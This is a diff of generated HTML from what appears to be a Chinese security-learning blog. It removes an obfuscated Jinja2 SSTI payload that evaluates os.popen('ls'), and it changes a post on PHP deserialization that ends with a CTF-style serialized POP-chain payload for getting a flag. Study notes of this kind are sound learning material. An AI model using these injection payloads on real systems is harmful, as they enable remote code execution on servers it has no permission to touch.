-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;&quot;&quot;[&quot;\x5F\x5Fc&quot;~&quot;lass&quot;~&quot;\x5F\x5F&quot;][&quot;\x5F\x5Fb&quot;~&quot;ases&quot;~&quot;\x5F\x5F&quot;][0][&quot;\x5F\x5Fsubc&quot;~&quot;lasses&quot;~&quot;\x5F\x5F&quot;]()[166][&quot;\x5F\x5Fi&quot;~&quot;nit&quot;~&quot;\x5F\x5F&quot;][&quot;\x5F\x5Fg&quot;~&quot;lobals&quot;~&quot;\x5F\x5F&quot;][&quot;\x5F\x5Fbuiltins\x5F\x5F&quot;][&quot;eval&quot;](&quot;\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x70\x6f\x70\x65\x6e\x28\x27\x6c\x73\x27\x29\x2e\x72\x65\x61\x64\x28\x29&quot;)&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
@@ -383,10 +169,9 @@
       <meta itemprop="name" content="Ed3n's Blog">
     </span>
       <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2024/03/09/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="post-title-link" itemprop="url">php反序列化学习记录</a>
-        </h2>
+        <h1 class="post-title" itemprop="name headline">
+          php反序列化学习记录
+        </h1>
 
         <div class="post-meta">
             <span class="post-meta-item">
@@ -419,7 +204,7 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h1 id="php反序列化"><a href="#php反序列化" class="headerlink" title="php反序列化"></a>php反序列化</h1><h2 id="前置代码条件："><a href="#前置代码条件：" class="headerlink" title="前置代码条件："></a>前置代码条件：</h2><h3 id="this"><a href="#this" class="headerlink" title="$this-&gt;"></a>$this-&gt;</h3><p><code>$this</code>在oop(面向对象编程)中是伪变量，是对一个对象示例的引用。伪变量不是真正的变量，形式上是变量。变量中存储的是固定的值，<code>$this</code>中并没有，哪个对象调用，<code>$this</code>就代表哪个对象， 也可以将<code>$this</code>理解为对象的引用，通过引用的方式访问一个对象的方法和属性。</p>
+        <h1 id="php反序列化"><a href="#php反序列化" class="headerlink" title="php反序列化"></a>php反序列化</h1><h2 id="前置代码条件："><a href="#前置代码条件：" class="headerlink" title="前置代码条件："></a>前置代码条件：</h2><h3 id="this"><a href="#this" class="headerlink" title="$this-&gt;"></a>$this-&gt;</h3><p><code>$this</code>在oop(面向对象编程)中是伪变量，是对一个对象示例的引用。伪变量不是真正的变量，形式上是变量。变量中存储的是固定的值，<code>$this</code>中并没有，哪个对象调用，<code>$this</code>就代表哪个对象， 也可以将<code>$this</code>理解为对象的引用，通过引用的方式访问一个对象的方法和属性。</p>
 <p><code>&lt;?php echo $this-&gt;tpl_id?&gt;</code>中(<code>$this-&gt;</code>表示实例化后调用具体对象)</p>
 <p><strong>实列</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	//创建一个类</span><br><span class="line">	Class Stu &#123;</span><br><span class="line">		public $name = &#x27; &#x27;;</span><br><span class="line">		public $age = 0;</span><br><span class="line">		//定义一个公共访问接口</span><br><span class="line">		public function say($name,$age)&#123;</span><br><span class="line">			$this-&gt;name = $name;</span><br><span class="line">			$this-&gt;age = $age;</span><br><span class="line">			return &#x27;我的名字是&#x27;.$this-&gt;name.</span><br><span class="line">						&#x27;今年我&#x27;.$this-&gt;age;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	//实例化两个对象</span><br><span class="line">	$jack = new Stu();</span><br><span class="line">	$smith = new Stu();</span><br><span class="line">	echo $jack-&gt;say(&#x27;jack&#x27;,30);</span><br><span class="line">	echo $smith-&gt;say(&#x27;smith&#x27;,20);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
@@ -548,21 +333,34 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url/?w00m=O%3A4%3A%22w22m%22%3A1%3A%7Bs%3A4%3A%22w00m%22%3BO%3A4%3A%22w33m%22%3A2%3A%7Bs%3A4%3A%22w00m%22%3BO%3A4%3A%22w44m%22%3A2%3A%7Bs%3A11%3A%22%00w44m%00admin%22%3Bs%3A4%3A%22w44m%22%3Bs%3A9%3A%22%00%2A%00passwd%22%3Bs%3A5%3A%2208067%22%3B%7Ds%3A4%3A%22w22m%22%3Bs%3A7%3A%22Getflag%22%3B%7D%7D</span><br></pre></td></tr></table></figure>
 
 
-      
     </div>
 
     
     
     
+
       <footer class="post-footer">
-        <div class="post-eof"></div>
+          <div class="post-tags">
+              <a href="/tags/php/" rel="tag"># php</a>
+              <a href="/tags/unserialization/" rel="tag"># unserialization</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item"></div>
+      <div class="post-nav-item">
+    <a href="/2024/03/09/Jinja2%20SSTI/" rel="next" title="Flask Jinja2 SSTI学习记录">
+      Flask Jinja2 SSTI学习记录 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
       </footer>
+    
   </article>
   
   
-  
-
-
   
 
 
@@ -615,6 +413,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">1.</span> <span class="nav-text">php反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE%E4%BB%A3%E7%A0%81%E6%9D%A1%E4%BB%B6%EF%BC%9A"><span class="nav-number">1.1.</span> <span class="nav-text">前置代码条件：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#this"><span class="nav-number">1.1.1.</span> <span class="nav-text">$this-&gt;</span></a></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-number">1.1.2.</span> <span class="nav-text">::</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%8C%E4%BB%80%E4%B9%88%E6%98%AF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%9F"><span class="nav-number">1.2.</span> <span class="nav-text">什么是序列化，什么是反序列化？</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#php%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%9Aserialize"><span class="nav-number">1.2.1.</span> <span class="nav-text">php序列化：serialize()</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%9E%E5%88%97%E5%8F%8A%E8%AF%A6%E8%A7%A3"><span class="nav-number">1.2.1.1.</span> <span class="nav-text">实列及详解</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%9Aunserialize"><span class="nav-number">1.2.2.</span> <span class="nav-text">php反序列化：unserialize()</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%9E%E5%88%97%E5%8F%8A%E8%AF%A6%E8%A7%A3-1"><span class="nav-number">1.2.2.1.</span> <span class="nav-text">实列及详解</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Magic-function"><span class="nav-number">1.2.2.2.</span> <span class="nav-text">Magic function</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#wakeup%E7%BB%95%E8%BF%87"><span class="nav-number">1.2.2.2.1.</span> <span class="nav-text">__wakeup绕过</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#16%E8%BF%9B%E5%88%B6%E7%BB%95%E8%BF%87%E5%AD%97%E7%AC%A6%E7%9A%84%E8%BF%87%E6%BB%A4"><span class="nav-number">1.2.2.2.2.</span> <span class="nav-text">16进制绕过字符的过滤</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%AE%9E%E4%BE%8B%E5%8F%8A%E8%AF%A6%E8%A7%A3"><span class="nav-number">1.2.2.2.2.1.</span> <span class="nav-text">实例及详解</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#php%E7%B1%BB%E5%90%8D%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87"><span class="nav-number">1.2.2.2.3.</span> <span class="nav-text">php类名大小写绕过</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="nav-number">1.2.2.2.4.</span> <span class="nav-text">+号绕过</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%A9%E7%94%A8-%E4%BD%BF%E4%B8%A4%E5%80%BC%E6%81%92%E7%AD%89"><span class="nav-number">1.2.2.2.5.</span> <span class="nav-text">利用&amp;使两值恒等</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%83%E9%80%B8%E9%97%AE%E9%A2%98"><span class="nav-number">1.2.2.3.</span> <span class="nav-text">反序列化逃逸问题</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%94%B1%E7%9F%AD%E5%8F%98%E9%95%BF"><span class="nav-number">1.2.2.3.1.</span> <span class="nav-text">由短变长</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%94%B1%E9%95%BF%E5%8F%98%E7%9F%AD"><span class="nav-number">1.2.2.3.2.</span> <span class="nav-text">由长变短</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#POP%E9%93%BE%E6%9E%84%E9%80%A0"><span class="nav-number">1.2.2.4.</span> <span class="nav-text">POP链构造</span></a></li></ol></li></ol></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
